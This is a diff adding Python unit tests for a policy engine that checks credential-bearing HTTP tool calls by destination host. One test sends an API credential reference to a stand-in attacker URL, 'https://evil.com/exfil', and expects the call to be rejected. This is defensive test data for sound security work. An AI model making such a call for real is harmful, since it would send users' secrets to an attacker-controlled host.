@@ -15,7 +15,7 @@ from shisad.security.credentials import (
     is_placeholder,
 )
 from shisad.security.pep import PEP, PolicyContext
-from shisad.security.policy import PolicyBundle
+from shisad.security.policy import EgressRule, PolicyBundle
 
 
 class TestPepRejectsRawSecrets:
@@ -150,3 +150,75 @@ class TestHostScopedBinding:
         assert store.resolve(placeholder, "api.anthropic.com") == "sk-ant-secret"
         assert store.resolve(placeholder, "docs.anthropic.com") == "sk-ant-secret"
         assert store.resolve(placeholder, "evil.com") is None
+
+
+class TestPepCredentialRefValidation:
+    """M0.8.4: PEP validates credential_ref host binding and logs usage."""
+
+    def _make_registry(self) -> ToolRegistry:
+        registry = ToolRegistry()
+        registry.register(
+            ToolDefinition(
+                name=ToolName("http_call"),
+                description="Make HTTP request with a credential ref",
+                parameters=[
+                    ToolParameter(name="url", type="string", required=True),
+                    ToolParameter(name="credential_ref", type="string", required=True),
+                ],
+                capabilities_required=[Capability.HTTP_REQUEST],
+                destinations=["api.openai.com"],
+            )
+        )
+        return registry
+
+    def test_credential_ref_allowed_for_destination(self) -> None:
+        store = InMemoryCredentialStore()
+        store.register(
+            CredentialRef("openai_api_key"),
+            "sk-real-secret",
+            CredentialConfig(allowed_hosts=["api.openai.com"]),
+        )
+        pep = PEP(
+            PolicyBundle(
+                default_require_confirmation=False,
+                egress=[EgressRule(host="api.openai.com")],
+            ),
+            self._make_registry(),
+            credential_store=store,
+        )
+
+        decision = pep.evaluate(
+            ToolName("http_call"),
+            {
+                "url": "https://api.openai.com/v1/chat/completions",
+                "credential_ref": "openai_api_key",
+            },
+            PolicyContext(capabilities={Capability.HTTP_REQUEST}),
+        )
+        assert decision.kind == PEPDecisionKind.ALLOW
+        assert pep.credential_attempts
+        assert pep.credential_attempts[-1].destination_host == "api.openai.com"
+
+    def test_credential_ref_rejected_for_non_allowed_host(self) -> None:
+        store = InMemoryCredentialStore()
+        store.register(
+            CredentialRef("openai_api_key"),
+            "sk-real-secret",
+            CredentialConfig(allowed_hosts=["api.openai.com"]),
+        )
+        pep = PEP(
+            PolicyBundle(default_require_confirmation=False),
+            self._make_registry(),
+            credential_store=store,
+        )
+
+        decision = pep.evaluate(
+            ToolName("http_call"),
+            {
+                "url": "https://evil.com/exfil",
+                "credential_ref": "openai_api_key",
+            },
+            PolicyContext(capabilities={Capability.HTTP_REQUEST}),
+        )
+        assert decision.kind == PEPDecisionKind.REJECT
+        assert "credential_ref" in decision.reason
